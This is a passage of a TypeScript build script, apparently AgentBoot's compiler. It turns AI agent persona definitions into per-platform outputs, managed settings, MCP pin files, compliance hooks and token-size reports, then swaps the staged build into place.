      if (!personasDir) continue;

      nodePersonasFound = true;
      const nodePersonaDirs = fs.readdirSync(personasDir).filter((entry) =>
        fs.statSync(path.join(personasDir, entry)).isDirectory()
      );

      for (const personaName of nodePersonaDirs) {
        if (enabledPersonas && !enabledPersonas.includes(personaName)) {
          continue;
        }

        const personaDir = path.join(personasDir, personaName);
        // Use first part as group name, second as team name for trait resolution
        const groupName = parts[0];
        const teamName = parts.length >= 2 ? parts[parts.length - 1] : undefined;

        const result = compilePersona(
          personaName,
          personaDir,
          traits,
          config,
          distPath,
          `nodes/${nodePath}`,
          groupName,
          teamName
        );
        allResults.push(result);
        log(`  ${chalk.green("✓")} ${nodePath}/${personaName}`);
      }
    }

    if (!nodePersonasFound) {
      log(chalk.gray("  (no node-level overrides found)"));
    }

    // AB-145: Generate scope-specific AGENTS.md for each node
    if (outputFormats.includes("agents")) {
      for (const { path: nodePath } of flatNodes) {
        // Collect personas that exist at this node
        const personasDir = resolveNodePersonasDir(HUB_ROOT, nodePath);
        if (!personasDir) continue;

        const nodePersonaConfigs = new Map<string, PersonaConfig>();
        // Start with core personas
        for (const [pName, pDir] of personaDirs) {
          if (enabledPersonas && !enabledPersonas.includes(pName)) continue;
          const pc = loadPersonaConfig(pDir);
          if (pc) nodePersonaConfigs.set(pName, pc);
        }
        // Override with node-specific personas
        for (const entry of fs.readdirSync(personasDir).filter(e => fs.statSync(path.join(personasDir, e)).isDirectory())) {
          const pc = loadPersonaConfig(path.join(personasDir, entry));
          if (pc) nodePersonaConfigs.set(entry, pc);
        }
        generateAgentsMd(config, distPath, nodePersonaConfigs, instrFileNames, lexiconEntries,
          coreInstructionsDir, packageInstructionsDir, traits, coreGotchasDir, `nodes/${nodePath}`);
      }
    }

    // Generate composition manifests for scope nodes
    for (const { path: nodePath } of flatNodes) {
      for (const fmt of outputFormats) {
        if (fmt === "agents" || fmt === "plugin" || fmt === "windsurf") continue;
        generateCompositionManifest(distPath, fmt, `nodes/${nodePath}`, config);
      }
    }

    // AB-160: Generate group/team managed settings fragments
    if (outputFormats.includes("claude")) {
      for (const { path: nodePath } of flatNodes) {
        const parts = nodePath.split("/");
        const isGroup = parts.length === 1;
        const isTeam = parts.length >= 2;

        const groupName = parts[0]!;
        const groupConfig = config.groups?.[groupName];

        if (isGroup && groupConfig) {
          const managedDir = path.join(distPath, "claude", `nodes/${nodePath}`, "managed-settings.d");
          ensureDir(managedDir);
          const fragment: Record<string, unknown> = {
            "// source": `Generated by AgentBoot — org:${config.org} / group:${groupName}`,
          };
          if (groupConfig.permissions) fragment["permissions"] = groupConfig.permissions;
          if (groupConfig.mcpServers) fragment["mcpServers"] = groupConfig.mcpServers;
          if (groupConfig.enabledPlugins) fragment["enabledPlugins"] = groupConfig.enabledPlugins;

          if (Object.keys(fragment).length > 1) {
            fs.writeFileSync(
              path.join(managedDir, "10-group.json"),
              JSON.stringify(fragment, null, 2) + "\n",
              "utf-8"
            );
            log(chalk.gray(`  → Managed settings: 10-group.json for ${groupName}`));
          }
        }

        if (isTeam) {
          const teamName = parts[parts.length - 1]!;
          const managedDir = path.join(distPath, "claude", `nodes/${nodePath}`, "managed-settings.d");
          ensureDir(managedDir);
          const fragment: Record<string, unknown> = {
            "// source": `Generated by AgentBoot — org:${config.org} / team:${groupName}/${teamName}`,
          };
          // Teams can have scope-specific settings (placeholder for team-specific config)
          if (Object.keys(fragment).length > 1) {
            fs.writeFileSync(
              path.join(managedDir, "20-team.json"),
              JSON.stringify(fragment, null, 2) + "\n",
              "utf-8"
            );
            log(chalk.gray(`  → Managed settings: 20-team.json for ${groupName}/${teamName}`));
          }
        }
      }
    }
  }

  // ---------------------------------------------------------------------------
  // 2b. AB-53: Compile domain layers
  // ---------------------------------------------------------------------------

  const domainResults = compileDomains(config, configDir, distPath, traits, outputFormats, scopeSeen);

  // F-6 gate: a path scope the target cannot express.
  //
  // Placed HERE, not beside the HARD gate: domain instructions have not been
  // compiled at that point and would escape the scan entirely.
  //
  // Inversion, not omission, is what this closes. `compileInstructions` never
  // read the source frontmatter — it stripped it and hardcoded
  // `alwaysApply: true` / `trigger: always_on`. Cursor, Windsurf and JetBrains
  // now receive the operator's exact scope (§2.2), so they are SILENT here:
  // nothing was lost, so there is nothing to say, and a warning on the fixed
  // path is how a channel gets tuned out.
  {
    const degraded = degradedFormats(outputFormats);
    const scoped = [...scopeSeen.values()];
    const violations = scopeViolations(scoped, outputFormats);
    const acked = degraded.length > 0
      ? scoped.filter((a) => a.globs.length > 0 && a.acknowledgedUnscoped)
      : [];

    if (acked.length > 0) {
      log(chalk.yellow(
        `  ⚠ ${acked.length} scoped instruction(s) are delivered always-on to: ${degraded.join(", ")}`,
      ));
      for (const a of acked) {
        log(chalk.yellow(`      ${a.name.padEnd(34)} applyTo: ${a.scopePath}`));
      }
      log(chalk.gray(`    Acknowledged on the artifact; the emitted files carry a Scope: preamble.`));
    }

    if (violations.length > 0) {
      log("");
      log(chalk.red(`  ✗ Path scoping cannot be expressed on: ${degraded.join(", ")}`));
      for (const v of violations) {
        log(chalk.red(`      ${v.artifact.name.padEnd(34)} applyTo: ${v.artifact.scopePath}`));
      }
      log(chalk.gray(
        `    These targets have no scoping mechanism, so a rule authored as narrow is`,
      ));
      log(chalk.gray(
        `    delivered always-on — the operator restricted it and the platform received`,
      ));
      log(chalk.gray(`    the opposite instruction, behind a signed manifest.`));
      log(chalk.gray(
        `    Fix by removing the target from personas.outputFormats, by widening the rule`,
      ));
      log(chalk.gray(
        `    to applyTo: "**", or — if always-on delivery is genuinely intended — add to`,
      ));
      log(chalk.gray(`    the artifact's frontmatter:`));
      log(chalk.gray(`      scope-unsupported: acknowledged`));
      log("");
      log(chalk.red(
        `  ✗ Build failed: ${violations.length} scoped instruction(s) target platforms that ` +
        `cannot express path scoping (${degraded.join(", ")}).`,
      ));
      log("");
      process.exit(1);
    }
  }
  allResults.push(...domainResults);

  // ---------------------------------------------------------------------------
  // 4. Generate PERSONAS.md index in each platform
  // ---------------------------------------------------------------------------

  generatePersonasIndex(allResults, config, corePersonasDir, distPath, "core", outputFormats);
  log(chalk.gray("\n  → PERSONAS.md written to each platform"));

  // H2 (F-4): hoisted OUT of the `claude` block.
  //
  // This call sat inside `if (outputFormats.includes("claude"))`, so a hub
  // building cursor/gemini/codex/jetbrains WITHOUT claude silently produced no
  // MCP config for any of them — and the Codex emitter's own comment
  // ("`.codex/config.toml` — already generated by generateCrossPlatformMcpConfigs")
  // was therefore false for exactly the build where it mattered. The function
  // gates each platform internally; nesting it under an unrelated one made the
  // whole cross-platform surface conditional on Claude Code being a target.
  generateCrossPlatformMcpConfigs(config, distPath, "core");

  // ---------------------------------------------------------------------------
  // 5. AB-57: Plugin output generation
  // ---------------------------------------------------------------------------

  // B5 fix: Only generate plugin output when claude format is active (plugin is always derived from claude)
  if (outputFormats.includes("claude")) {
    generatePluginOutput(config, distPath, allResults, corePersonasDir, traits);
  }

  // ---------------------------------------------------------------------------
  // 6. AB-59/60/63/147: Compliance & audit trail hooks
  // ---------------------------------------------------------------------------

  if (outputFormats.includes("claude")) {
    generateComplianceHooks(distPath, "core", complianceHookScripts);
    generateComplianceSettingsJson(config, distPath, "core");

    // AB-147: Per-persona hook compilation — merge persona-level hooks into settings
    generatePersonaHooks(config, distPath, "core", personaDirs, enabledPersonas);
  }

  // ---------------------------------------------------------------------------
  // 7. AB-64: Telemetry NDJSON schema
  // ---------------------------------------------------------------------------

  generateTelemetrySchema(distPath);

  // v0.19.0: MCP digest pins — compiled into every platform's core dir so a
  // SPOKE (or its CI) can run the use-time rug-pull check without the hub
  // config: `agentboot mcp-verify --pins .claude/mcp-pins.json`. Only emitted
  // when the org has an approved-server list; entries carry identity pins,
  // toolsDigest, and registry provenance verbatim.
  if ((config.mcp?.approved?.length ?? 0) > 0) {
    const pinsJson = JSON.stringify({ approved: config.mcp!.approved }, null, 2) + "\n";
    for (const platform of outputFormats) {
      const coreDir = path.join(distPath, platform, "core");
      if (fs.existsSync(coreDir)) {
        fs.writeFileSync(path.join(coreDir, "mcp-pins.json"), pinsJson, "utf-8");
      }
    }
    const pinned = config.mcp!.approved!.filter((s) => s.toolsDigest).length;
    log(chalk.gray(`  → MCP pins emitted (${pinned}/${config.mcp!.approved!.length} servers digest-pinned)`));
  }

  // D3: org telemetry sink config — compiled into every platform's core dir so
  // sync delivers it to spokes (org-managed, not per-developer). The shipper
  // (`agentboot telemetry-ship`) discovers it from the synced config dir.
  if (config.telemetry?.sink) {
    const sinkJson = JSON.stringify(config.telemetry.sink, null, 2) + "\n";
    for (const platform of outputFormats) {
      const coreDir = path.join(distPath, platform, "core");
      if (fs.existsSync(coreDir)) {
        fs.writeFileSync(path.join(coreDir, "telemetry-sink.json"), sinkJson, "utf-8");
      }
    }
    log(chalk.gray(`  → Telemetry sink config emitted (org collector: ${config.telemetry.sink.url})`));
  }

  // ---------------------------------------------------------------------------
  // 8. AB-61: Managed settings
  // ---------------------------------------------------------------------------

  generateManagedSettings(config, distPath, outputFormats);

  // B8: single deployable managed artifact per scope, merged from the fragments
  if (outputFormats.includes("claude")) {
    const mergeNodePaths = scopeNodes ? flattenNodes(scopeNodes).map((n) => n.path) : [];
    generateMergedManagedArtifacts(distPath, mergeNodePaths, config);
  }

  // ---------------------------------------------------------------------------
  // 9. AB-25: Token budget estimation
  // ---------------------------------------------------------------------------

  const tokenBudget = config.output?.tokenBudget?.warnAt ?? 8000;
  log(chalk.cyan("\nToken estimates:"));

  // B11: prompt size is a budgeted resource — large personas cost latency,
  // money, context room, and instruction adherence. warnAt keeps the advisory
  // behavior; failAt (opt-in) turns a size regression into a CI failure. The
  // per-persona sizes are also written to dist/persona-sizes.json so a hub PR
  // diff SHOWS prompt-size changes instead of hiding them in compiled bodies.
  const tokenFailAt = config.output?.tokenBudget?.failAt;
  const sizeReport: Record<string, number> = {};
  const overBudget: string[] = [];

  for (const result of allResults.filter((r) => r.platforms.length > 0)) {
    const skillPath = path.join(distPath, "skill", "core", result.persona, "SKILL.md");
    if (fs.existsSync(skillPath)) {
      const content = fs.readFileSync(skillPath, "utf-8");
      // Heuristic: ~4 chars/token for English/markdown prose. Not a tokenizer —
      // treat as a stable relative measure, not an exact count.
      const estimatedTokens = Math.ceil(content.length / 4);
      sizeReport[result.persona] = estimatedTokens;

      if (tokenFailAt !== undefined && estimatedTokens > tokenFailAt) {
        overBudget.push(`${result.persona} (~${estimatedTokens} tokens > failAt ${tokenFailAt})`);
        log(chalk.red(`  ✗ [${result.persona}] estimated ${estimatedTokens} tokens exceeds tokenBudget.failAt (${tokenFailAt})`));
      } else if (estimatedTokens > tokenBudget) {
        log(
          chalk.yellow(
            `  ⚠ [${result.persona}] estimated ${estimatedTokens} tokens (budget: ${tokenBudget})`
          )
        );
      } else {
        log(chalk.gray(`  ${result.persona}: ~${estimatedTokens} tokens`));
      }
    }
  }

  fs.writeFileSync(
    path.join(distPath, "persona-sizes.json"),
    JSON.stringify(
      { "// note": "Estimated tokens per compiled persona (chars/4 heuristic). Diff this file in hub PRs to see prompt-size changes.", personas: sizeReport },
      null, 2
    ) + "\n",
    "utf-8"
  );

  if (overBudget.length > 0) {
    console.error(chalk.red(
      `\n✗ ${overBudget.length} persona(s) exceed output.tokenBudget.failAt:\n  ${overBudget.join("\n  ")}\n` +
      `  Trim the persona/traits or raise the budget deliberately.`
    ));
    process.exit(1);
  }

  // ---------------------------------------------------------------------------
  // F-1: swap the staged tree into place, reporting what stopped being produced.
  // Everything above wrote to staging; from here on dist/ is authoritative.
  // ---------------------------------------------------------------------------

  // N1: stamp the staging tree BEFORE the swap, so the stamp arrives with the
  // artifacts it describes rather than as a separate, interruptible write. A
  // `status: "success"` stamp can therefore only exist on a tree that reached
  // this line — i.e. past every gate above.
  writeDistStamp(distPath, {
    status: "success",
    configDigest,
    outputFormats: [...outputFormats],
    builtAt: new Date().toISOString(),
    agentbootVersion: packageVersion(),
  });

  swapDistAndReport(distPath, finalDistPath);
  // The swap succeeded: dist/ now genuinely corresponds to this config, so a
  // later non-zero exit (e.g. an unrelated post-swap failure) must NOT mark it
  // stale.
  distInvalidationContext = null;

  // ---------------------------------------------------------------------------
  // Summary
  // ---------------------------------------------------------------------------

  const successCount = allResults.filter((r) => r.platforms.length > 0).length;

  log(
    chalk.bold(
      // Hub output path — HUB_ROOT, not ROOT. Same defect as the provenance
      // header: against the installed package dir this printed
      // "→ ../../../../../Users/<name>/hub/dist/".
      `\n${chalk.green("✓")} Compiled ${successCount} persona(s) × ${outputFormats.length} platform(s) → ${path.relative(HUB_ROOT, finalDistPath)}/`
    )
  );
  for (const fmt of outputFormats) {
    log(chalk.gray(`  → dist/${fmt}/`));
  }
}

try {
  main();
} catch (err: unknown) {
  console.error(chalk.red("Unexpected error:"), err);
  process.exit(1);
}
